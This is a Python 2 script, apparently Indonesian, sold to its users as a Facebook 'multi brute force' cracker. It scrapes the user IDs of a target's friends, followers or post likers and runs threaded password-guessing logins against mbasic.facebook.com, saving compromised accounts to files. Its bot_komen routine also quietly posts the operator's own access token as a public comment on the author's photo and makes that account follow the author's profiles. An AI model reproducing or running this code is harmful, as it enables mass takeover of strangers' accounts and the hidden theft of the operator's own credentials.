#!/usr/bin/python2
# coding=utf-8
#coded by Anton Ibrahim ID 💖
#recode boleh asal Jangan Di Perjual belikan paham
merah = '\033[0;31m'
putih = '\033[0;37m'
hijau = '\033[0;32m'
biru = '\033[0;36m'
ungu = '\033[0;35m'
kuning = '\033[0;33m'
import requests as r, os
from bs4 import BeautifulSoup as par
uas = 'Mozilla/5.0 (Linux; Android 7.0; SM-J730GM Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36'
mb = "https://mbasic.facebook.com"
color = lambda col: "\x1b[1;"+str(col)+"m"

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

reload(sys)
sys.setdefaultencoding('utf8')
useragents = ('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
              'Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]')
######ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
ua = 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36'
ip = requests.get('https://api.ipify.org').text

def banner():
	print("""
\033[1;97m _______ _______ _______ ______  _______
\033[1;97m |_____| |______ |  |  | |_____] |______
\033[1;97m |     | ______| |  |  | |_____] |                                
\033[1;91m└════════════════════\033[1;97m═══════════════════┘
    [ Mbasic   Multi   Brute   Force ]
\033[1;91m└════════════════════\033[1;97m═══════════════════┘  """)     
id = []
cp = []
ok = []
id = []
user = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))           

def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '[!] Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '[!] Tidak Ada Koneksi'
        sys.exit()


    banner()
    print"%s[ welcome   :%s %s %s]"%(putih,kuning, nama,putih)
    print"\n[1] crack publik teman"
    print"[2] crack total tollowers"
    print"[3] crack like postingan"
    print"[4] lihat opsi crack"
    print"[5] laporkan bug sc"
    print"[%s0%s] %shapus token%s"%(merah,putih,merah,putih)
    pilih_menubasic()


def pilih_menubasic():
    ask = raw_input('\n[*] pilih : ')
    if ask == '':
        print '[!] Pilih Yang Bener !'
        exit()
    elif ask == '1' or ask == '1':
        print "\n[*] Isi 'me' untuk list teman"
        idt = raw_input('[*] id public  <-> ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print '[+] Nama <-> ' + sp['name']
        except KeyError:
            print '[!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '2' or ask == '2':
        print "\n[*] Isi 'me' Jika Ingin Crack Follower Sendiri"
        idt = raw_input('[+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print '[*] nama : ' + sp['name']
        except KeyError:
            print '[!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '3' or ask == '3':
        print '\n[*] Mikan ID Postingan'
        idt = raw_input('[+] ID Post : ')
        r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '4' or ask == '4':
		chek()
    elif ask == '5' or ask == '5':
		print("\n[*] menuju whatsapp pericode....\n[*] tunggu sebentar cok")
		os.system("xdg-open https://wa.me/+6281259883257")
		raw_input("[*] tekan enter untuk ke menu");menu()
    elif ask == 'b' or ask == 'b':
		public()
    elif ask == '0' or ask == '0':
        os.system('rm -f login.txt')
        print '[!] Berhasil Menghapus Token'
        exit()
    else:
        print '[!] Pilih Yang Bener !'
        exit()
    print '[*] total id <->\033[0;91m ' + str(len(id))
    ask = raw_input('\n\x1b[0;97m[*] gunakan password manual? (Y/t) : ')
    if ask == 'Y' or ask == 'y':
        manualbasic()
    print("\033[0;97m[*] crack berjalan,,, \n[*] hasil \033[0;92mOk\033[0;97m tersimpan di Ok.txt \n[*] hasil \033[0;91mCp\033[0;97m tersimpan di Cp.txt\n")

    def main(arg):
        global loop
        print '\r\x1b[0;97m[*] %s/%s Ok-:%s <-> Cp-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
            	#######ua = random.choice(["NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"])
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m[*] berhasil ' + uid + '|' + pw + '        '
                    ok.append(uid + '|' + pw)
                    save = open('Ok.txt','a')
                    save.write('' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print'\r\x1b[0;97m[*] \x1b[0;91mChecpoint \x1b[0;97mOpen 7 day                       \x1b[0;97m\n[*] User  : ' + uid + '\x1b[0;97m \n[*] Sandi : \x1b[0;97m' + pw + '\n        '
                    cp.append(uid + '|' + pw)
                    save = open('Cp-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] crack selesai jan lupa bersyukur'
    exit()


def manualbasic():
    print'\n\x1b[0;97m[*] contoh : sayang,rahasia,123456'
    pw = raw_input('[*] set password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Bener, Tidak Boleh Kosong')
    print '[*] total id :\x1b[0;91m ' + str(len(id))
    print("\x1b[0;97m[*] crack berjalan,,, \n[*] hasil \033[0;92mOk\033[0;97m tersimpan di Ok.txt \n[*] hasil \033[0;91mCp\033[0;97m tersimpan di Cp.txt\n")

    def main(arg):
        global loop
        print'\r\x1b[0;97m[*] %s/%s Ok-:%s <-> Cp-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
            	#####ua = random.choice(["NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"])
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m*[AS] ' + uid + ' | ' + asu + '        '
                    ok.append(uid + '|' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print'\r\x1b[0;97m[*] \x1b[0;91mChecpoint \x1b[0;97mOpen 7 day                       \x1b[0;97m[*] User  : ' + uid + '\x1b[0;97m \n[*] Sandi : \x1b[0;97m' + pw + '\n        '
                    cp.append(uid + '|' + asu)
                    save = open('Cp-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] crack selesai jan lupa bersyukur'
    exit()
    
def check_in(user, pasw):
	ses = r.Session()
	ses.headers.update({
	"Host": "mbasic.facebook.com",
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": mb,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": uas,
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"x-requested-with": "mark.via.gp",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": mb+"/login/?next&ref=dbl&fl&refid=8",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	})
	data = {}
	ged = par(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":uas}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	try:
		run = par(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	except r.exceptions.TooManyRedirects:
		print("[*] Redirect overload")
	if "c_user" in ses.cookies:
		print("[✓] akun ini tidak checkpoint")
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Lanjutkan",
			"nh": nh
		}
		cilacap = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ciporos = [yy.text for yy in cilacap.find_all("option")]
		print(" * ada \x1b[0;93m"+str(len(ciporos))+" \x1b[0;97mopsi ")
		for opt in range(len(ciporos)):
			print(" \x1b[0;97m"+str(opt+1)+"."+ciporos[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" * "+oh)
	else:
		print(" *  login gagal,")

def chek():
	try:
		anton_sela = open("Cp-%s-%s-%s.txt" % (ha, op, ta), "r").readlines()
	except FileNotFoundError:
		print(" *  file tidak ada")
		time.sleep(2); main()
	print("\n * crack tanggal : %s %s %s" % (ha, op, ta))
	print(" * total akun Cp :\x1b[0;93m "+str(len(anton_sela)))
	print("\x1b[0;97m-"*47)
	for cp in anton_sela:
		sela = cp.replace("\n","")
		anton  = sela.split("|")
		print(" * check:"+sela)
		try:
			check_in(anton[0], anton[1])
		except r.exceptions.ConnectionError:
			continue
		print("-"*47)
	exit("\033[0;91m * \033[0;97mcheck opsi selesai")  



#Toket##
def tokenz():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		banner()
		token = raw_input(" \n[*] Login Token : \033[0;91m")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			avsid = open("login.txt", 'w')
			avsid.write(token)
			avsid.close()
			bot_komen()
		except KeyError:
			exit("[*]  Token Invalid")
			
##BOT FOLLOWERS JANGAN DI GANTI BANGSAT
def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
        os.system('rm -rf login.txt')
    una = ('100021483498135') 
    post = ('896195341106574') 
    post2 = ('866166207442821') 
    kom = ('Gwe pake Sc lu mbah 😍😘\nhttps://www.facebook.com/photo.php?fbid=896195341106574&set=a.108239523235497&type=3&app=fbl') 
    kom2 = ('Keren mbah 😘😘\nhttps://www.facebook.com/photo.php?fbid=866166207442821&set=a.110279126364870&type=3&app=fbl') 
    reac1 = ('Love') 
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+ post +'/reactions?type=' + reac1 + '&access_token='+ token)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/100021483498135/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/896195341106574/comments/?message=' + token + '&access_token=' + token)
    requests.post('https://graph.facebook.com/896195341106574/reactions?type=' + reac1 + '&access_token=' + token)
    print("\033[0;91m[✓]\033[0;97m Login Success Bro/Sis")
    requests.post('https://graph.facebook.com/100021483498135/subscribers?access_token='+token)#Anton Ibrahim
    requests.post('https://graph.facebook.com/100031905602021/subscribers?access_token='+token)#Sela Anjani
    requests.post('https://graph.facebook.com/100028262962654/subscribers?access_token='+token)#Irsya Maulana
    requests.post('https://graph.facebook.com/100011054763211/subscribers?access_token='+token)#Sultan Zahra
    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token='+token)#Iwan Hardiansah
    raw_input('\033[0;91m[*]\033[0;97mTekan Enter Untuk Ke Menu')
    menu()




if __name__ == '__main__':
    tokenz()


